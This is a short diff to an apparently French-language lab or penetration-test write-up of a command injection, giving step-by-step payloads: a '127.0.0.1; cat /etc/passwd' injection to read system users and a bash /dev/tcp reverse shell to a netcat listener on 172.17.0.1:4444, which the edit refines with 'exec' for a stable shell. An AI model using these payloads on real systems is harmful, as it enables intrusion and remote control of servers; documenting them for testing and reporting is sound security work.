@@ -121,7 +121,7 @@
 3. `127.0.0.1; cat /etc/passwd` → extraction des utilisateurs système
 4. **Reverse shell** : trouver l'IP Docker (`ip addr show docker0` → `172.17.0.1`)
 5. Lancer nc en écoute sur `:4444`
-6. Injecter `127.0.0.1; bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'`
+6. Injecter `127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'` (⚠️ `exec` est nécessaire pour un shell interactif stable)
 7. Shell interactif obtenu → `whoami` = `www-data`
 
 **Risques :**
